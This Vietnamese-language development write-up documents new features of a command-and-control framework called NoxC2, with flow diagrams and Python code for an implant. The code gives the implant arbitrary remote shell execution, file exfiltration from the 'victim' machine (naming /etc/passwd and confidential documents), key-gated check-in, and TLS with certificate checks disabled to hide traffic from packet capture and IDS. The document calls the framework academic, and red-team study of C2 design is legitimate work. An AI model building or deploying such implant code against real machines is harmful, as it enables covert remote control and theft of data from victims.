# Giải Thích Chi Tiết Các Thay Đổi Cốt Lõi (Core & Agent) Trên Branch `sim`

> Tài liệu này tổng hợp và giải thích toàn bộ các thay đổi cốt lõi phía **Backend Server** và **Agent Implant** (bỏ qua phần Web Frontend) trên branch `sim`.

---

## 1. Tóm Tắt Các Thay Đổi Đã Thực Hiện

Trên branch `sim`, 4 tính năng / cải tiến kỹ thuật lớn đã được hoàn thiện:

1. **Thực thi Shell thực tế (`Real Remote Shell Execution`):**
   - Thay thế các phản hồi giả lập (stub commands) trên Agent bằng việc thực thi lệnh hệ thống thật qua `subprocess.run()`.
2. **Tải file từ Agent về Server (`File Download`):**
   - Bổ sung lệnh `agent.download <remote_path>` cho phép Server kéo file từ máy nạn nhân về và tự động lưu vào thư mục `downloads/<uuid>/`.
3. **Xác thực khóa bảo mật Pre-Shared Key (`X-Agent-Key`):**
   - Kiểm soát Agent kết nối thông qua Token/Key cấu hình trong `.env` (`NOX_AGENT_KEY`), chặn các kết nối lạ hoặc quét cổng tự do vào C2.
4. **Mã hoá toàn bộ đường truyền với HTTPS / TLS (`Transport Security`):**
   - Chuyển đổi toàn bộ giao tiếp mạng từ HTTP plain text sang HTTPS/TLS tiêu chuẩn.
   - Tự động sinh chứng chỉ self-signed (`certs/server.crt` & `certs/server.key`) nếu chưa có.
   - Phía Agent tận dụng module `ssl` có sẵn trong Python stdlib để kết nối bảo mật mà **không cần cài thêm bất kỳ thư viện ngoài nào (100% Zero-Dependency)**.

---

## 2. Chi Tiết Từng Thay Đổi: Công Dụng, Ảnh Hưởng & Lý Do

---

### 2.1. Thực thi Shell thực tế (`Real Remote Shell Execution`)

#### 📌 Công dụng là gì?
Trước đây, Agent chỉ hỗ trợ một số lệnh cố định được hardcode (như `whoami`, `hostname`, `ipconfig`). Bất kỳ lệnh nào khác đều không chạy được thật trên hệ thống nạn nhân.

Thay đổi này trang bị cho Agent hàm `run_shell(command)`, cho phép chạy **mọi câu lệnh của hệ điều hành** (cmd/PowerShell trên Windows, bash/sh trên Linux).

#### ⚙️ Ảnh hưởng & Lợi ích:
- **Khả năng điều khiển toàn diện:** Operator có thể chạy các lệnh quản trị, trinh sát mạng, truy vấn tiến trình, ghi file, pipeline (`|`), chuyển hướng I/O (`>`), nối lệnh (`&&`, `;`).
- **An toàn, không làm treo Agent:** Được bọc trong `timeout=30s`. Nếu lệnh bị treo (ví dụ `ping` vô hạn hoặc chương trình chờ tương tác), Agent tự động ngắt và trả về thông báo lỗi thay vì bị crash/đơ tiến trình.
- **Bắt trọn cả `stdout` lẫn `stderr`:** Trả về đầy đủ kết quả kể cả khi câu lệnh bị lỗi trên máy nạn nhân.

---

### 2.2. Tải file từ Agent về Server (`File Download`)

#### 📌 Công dụng là gì?
Cho phép Operator trích xuất (exfiltrate) các file từ máy victim về máy chủ C2 qua lệnh:
```bash
agent.download <đường_dẫn_file_trên_agent>
```

#### ⚙️ Ảnh hưởng & Lợi ích:
- **Thu thập dữ liệu mục tiêu:** Lấy trộm file cấu hình, log, tài liệu mật (`/etc/passwd`, `hosts`, `.docx`, `.pdf`, `.zip`, `.evtx`, ...).
- **Mã hoá nhị phân an toàn với Base64:** Tránh việc dữ liệu nhị phân (binary) làm hỏng cấu trúc chuỗi JSON khi truyền qua mạng.
- **Tự động tổ chức thư mục lưu trữ trên Server:** Server tự động tạo thư mục `downloads/<agent_uuid>/<tên_file>` và lưu file nguyên vẹn.
- **Giới hạn an toàn (50MB):** Có cơ chế chặn đọc các file quá lớn để tránh làm tràn bộ nhớ RAM của Agent.

---

### 2.3. Xác thực Pre-Shared Key (`X-Agent-Key`)

#### 📌 Công dụng là gì?
Tạo một "mật mã chung" giữa Server và Agent. Khi Agent gửi request đến Server (đăng ký `/connect`, lấy lệnh `/command`, trả kết quả `/message`), nó phải đính kèm Header:
```http
X-Agent-Key: <khóa_bí_mật>
```

#### ⚙️ Ảnh hưởng & Lợi ích:
- **Chống can thiệp / Spam kết nối:** Người ngoài hoặc các công cụ quét tự động (Shodan, Nmap, Security Scanners) khi quét trúng cổng C2 sẽ không thể đăng ký bừa bãi Agent giả vào hệ thống.
- **Linh hoạt cấu hình:** Có thể cấu hình qua biến môi trường `.env` (`NOX_AGENT_KEY`). Nếu để trống, hệ thống tự động cho phép kết nối tự do (thuận tiện khi test local).

---

### 2.4. Mã hoá đường truyền HTTPS / TLS (`Transport Security`)

#### 📌 Công dụng là gì?
Chuyển toàn bộ giao thức truyền tải từ `http://` sang `https://`. Mọi gói tin truyền qua mạng đều được mã hoá ở tầng TLS.

#### ⚙️ Ảnh hưởng & Lợi ích:
- **Bảo mật tuyệt đối trên đường truyền:** Ẩn toàn bộ URL endpoint, HTTP Headers (`X-UUID`, `X-Agent-Key`), nội dung lệnh điều khiển và nội dung file upload/download trước các thiết bị bắt gói tin (Wireshark, Router, Firewall, IDS/IPS).
- **Zero-Dependency (Không mất tính chất của Implant):**
  - **Server:** Tận dụng `ssl.SSLContext` tích hợp sẵn trong Werkzeug WSGI.
  - **Agent:** Sử dụng module `ssl` có sẵn của Python stdlib (`ssl._create_unverified_context()`) kết hợp `urllib.request`. Không cần `pip install cryptography` hay bất kỳ thư viện C nào trên máy nạn nhân.
- **Tự động hoá sinh chứng chỉ (Auto-Provisioning):** Nếu Server chưa có file `certs/server.crt` & `certs/server.key`, hàm `ensure_ssl_certificates()` sẽ tự động gọi `openssl` để tạo cert self-signed 2048-bit mà không cần thao tác thủ công.

---

## 3. Giải Thích Luồng Hoạt Động (Flow Diagrams)

---

### 3.1. Luồng Khởi Động & Thiết Lập Kênh Bảo Mật HTTPS

```
[Khởi động Server]
       │
       ▼
Kiểm tra certs/server.crt & server.key?
  ├── Chưa có ──► Tự động tạo bằng OpenSSL (ensure_ssl_certificates)
  └── Đã có   ──► Nạp file
       │
       ▼
Tạo ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
       │
       ▼
Flask + Werkzeug WSGI khởi động lắng nghe tại: https://127.0.0.1:8080
```

---

### 3.2. Luồng Đăng Ký Agent & Giao Tiếp Có Xác Thực Key

```
   AGENT IMPLANT                                          SERVER C2
(Pure Python Stdlib)                                   (Flask + Werkzeug)
       │                                                       │
       │ 1. Tạo SSL context bỏ qua verify cert                │
       │    ssl._create_unverified_context()                   │
       │                                                       │
       │ 2. POST https://127.0.0.1:8080/connect                │
       │    Header: X-UUID: <uuid>                             │
       │    Header: X-Agent-Key: <key>                         │
       │    Body: JSON({type: "register", data: {...}})        │
       │──────────────────────────────────────────────────────►│
       │                                                       │ 3. Kiểm tra X-Agent-Key
       │                                                       │    Khớp key?
       │                                                       │    ├── Sai: Trả về 401 Unauthorized
       │                                                       │    └── Đúng: Lưu Agent vào ClientManager
       │                                                       │
       │◄──────────────────────────────────────────────────────│
       │ 4. Nhận 200 OK kèm ACK                                │
       │                                                       │
       ▼                                                       ▼
```

---

### 3.3. Luồng Thực Thi Remote Shell

```
OPERATOR (CLI)                 SERVER TRANSPORT                  AGENT IMPLANT
      │                               │                                │
      │ Gõ: shell whoami              │                                │
      │──────────────────────────────►│                                │
      │                               │ Đưa lệnh vào __send_queues     │
      │                               │                                │
      │                               │◄─── GET /command (Long-poll) ──│
      │                               │     (Chờ tối đa 50s)           │
      │                               │                                │
      │                               │─── Trả về task JSON ──────────►│
      │                               │    {data: "whoami"}            │
      │                               │                                │
      │                               │                                │ 1. Nhận task
      │                               │                                │ 2. Gọi run_shell("whoami")
      │                               │                                │ 3. subprocess.run()
      │                               │                                │ 4. Thu được output
      │                               │                                │
      │                               │◄─── POST /message ─────────────│
      │                               │     {type: "result",           │
      │                               │      data: "<kết_quả>"}        │
      │                               │                                │
      │◄── In kết quả ra màn hình ────│                                │
      │    From 127.0.0.1: <output>   │                                │
```

---

### 3.4. Luồng Tải File (File Download: Agent → Server)

```
OPERATOR (CLI)                 SERVER CORE                       AGENT IMPLANT
      │                             │                                  │
      │ agent.download /etc/passwd  │                                  │
      │────────────────────────────►│ Gửi task dict dạng JSON:         │
      │                             │ {"command": "agent.download",    │
      │                             │  "remote_path": "/etc/passwd"}   │
      │                             │─────────────────────────────────►│
      │                             │                                  │
      │                             │                                  │ 1. Nhận lệnh "agent.download"
      │                             │                                  │ 2. download_handler.py đọc file
      │                             │                                  │ 3. base64.b64encode(file_bytes)
      │                             │                                  │ 4. Đóng gói payload:
      │                             │                                  │    {status: "success",
      │                             │                                  │     file_name: "passwd",
      │                             │                                  │     file_data: "<base64>"}
      │                             │                                  │
      │                             │◄── Gửi kết quả về POST /message ─│
      │                             │                                  │
      │                             │ 5. Nhận response dạng dict       │
      │                             │ 6. Phát hiện key 'file_data'     │
      │                             │ 7. base64.b64decode()            │
      │                             │ 8. Ghi vào downloads/<uuid>/     │
      │                             │                                  │
      │◄── Thông báo tải thành công─│                                  │
      │    Saved: downloads/...     │                                  │
```

---

## 4. Hướng Dẫn Cách Thêm/Tích Hợp Các Thay Đổi Này Vào Codebase

Dưới đây là chi tiết kỹ thuật từng bước code đã được triển khai vào cấu trúc hệ thống để bạn dễ dàng nắm bắt hoặc mở rộng thêm tính năng tương tự:

---

### Bước 1: Thêm Xác Thực Key & Cấu Hình HTTPS (`src/server/config/config.py`)

1. **Đọc cấu hình từ biến môi trường (`.env`):**
   ```python
   AGENT_KEY     = os.getenv("NOX_AGENT_KEY", "")
   USE_HTTPS     = os.getenv("NOX_USE_HTTPS", "true").lower() in ("true", "1", "yes")
   SSL_CERT_PATH = os.getenv("NOX_SSL_CERT") or "certs/server.crt"
   SSL_KEY_PATH  = os.getenv("NOX_SSL_KEY") or "certs/server.key"
   ```

2. **Viết hàm tự động tạo chứng chỉ SSL (`ensure_ssl_certificates`):**
   - Sử dụng lệnh `openssl req -x509 -newkey rsa:2048 ...` sinh cert nếu file chưa tồn tại trên ổ cứng.

---

### Bước 2: Nạp SSL & Kiểm Tra Key Vào HTTP Transport (`src/server/transport/http_transport.py`)

1. **Kiểm tra Token Key ở các Route của Flask:**
   ```python
   def __check_agent_auth():
       if AGENT_KEY:
           client_key = request.headers.get("X-Agent-Key", "")
           if client_key != AGENT_KEY:
               return False
       return True
   ```
   Nếu `__check_agent_auth()` trả về `False`, Server ngắt request và trả mã `401 Unauthorized`.

2. **Cấu hình SSLContext cho Werkzeug:**
   ```python
   if USE_HTTPS:
       ensure_ssl_certificates()
       ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
       ssl_ctx.load_cert_chain(certfile=SSL_CERT_PATH, keyfile=SSL_KEY_PATH)
   else:
       ssl_ctx = None

   self.__server = make_server(..., ssl_context=ssl_ctx)
   ```

---

### Bước 3: Nâng Cấp Agent Implant (`src/agent/test.py` & `download_handler.py`)

1. **Khởi tạo SSL Context bỏ qua kiểm tra cert tự ký (Zero-Dependency):**
   ```python
   import ssl
   import urllib.request

   # Tạo context không verify cert tự ký của C2
   _SSL_CONTEXT = ssl._create_unverified_context()
   ```

2. **Đính kèm `X-Agent-Key` trong hàm gửi request (`send_json`):**
   ```python
   req = urllib.request.Request(url, data=data, method=method)
   req.add_header('X-UUID', AGENT_ID)
   if AGENT_KEY:
       req.add_header('X-Agent-Key', AGENT_KEY)
   response = urllib.request.urlopen(req, context=_SSL_CONTEXT, timeout=timeout)
   ```

3. **Cài đặt hàm chạy Shell thật (`run_shell`):**
   ```python
   import subprocess

   def run_shell(command):
       try:
           res = subprocess.run(
               command,
               shell=True,
               capture_output=True,
               text=True,
               timeout=30,
               env=os.environ.copy()
           )
           return (res.stdout + res.stderr).rstrip()
       except subprocess.TimeoutExpired:
           return "[!] Command timed out after 30s"
       except Exception as e:
           return f"[!] Execution error: {e}"
   ```

4. **Tạo handler cho File Download (`src/agent/download_handler.py`):**
   - Đọc file dưới dạng nhị phân (`'rb'`).
   - Kiểm tra `os.path.exists` và `file_size <= 50MB`.
   - Mã hoá chuỗi: `base64.b64encode(file_data).decode('utf-8')`.

---

### Bước 4: Đăng Ký Lệnh `agent.download` và Lưu File Trên Server

1. **Tạo Command Class (`src/server/commands/agent/file_download.py`):**
   - Kế thừa lớp `Command` và gắn decorator `@register`.
   - Thuộc tính `group = "agent"`, `name = "agent.download"`.
   - Gửi payload dạng dict `{"command": "agent.download", "remote_path": remote_path}` tới session của Agent.

2. **Import vào `src/server/commands/__init__.py`:**
   ```python
   from .agent.file_download import FileDownload
   ```
   *(Bắt buộc phải import để decorator `@register` được kích hoạt khi nạp module).*

3. **Tự động nhận diện và lưu file tải về (`src/server/core/server.py`):**
   - Trong hàm `handle_client()`, kiểm tra nếu `result_data` trả về là một `dict` chứa trường `'file_data'`:
   ```python
   if isinstance(result_data, dict) and 'file_data' in result_data:
       self.handle_file_download(uuid, addr, result_data)
   ```
   - Hàm `handle_file_download` sẽ giải mã base64 và ghi dữ liệu ra đĩa trong thư mục `downloads/<uuid>/`.

---

## 5. Tổng Kết

Tất cả các thay đổi trên đã biến NoxC2 từ một bản PoC đơn giản thành một C2 framework học thuật hoàn chỉnh:
- **Bảo mật:** Toàn bộ dữ liệu được mã hoá qua TLS và xác thực bằng Pre-Shared Key.
- **Mạnh mẽ:** Thực thi lệnh shell thực tế, hỗ trợ trao đổi dữ liệu 2 chiều (Upload / Download file).
- **Tối ưu Implant:** Agent giữ vững nguyên tắc **Pure Python Stdlib (Zero-Dependency)**, tương thích linh hoạt trên nhiều môi trường mà không cần cài đặt thêm package ngoài.
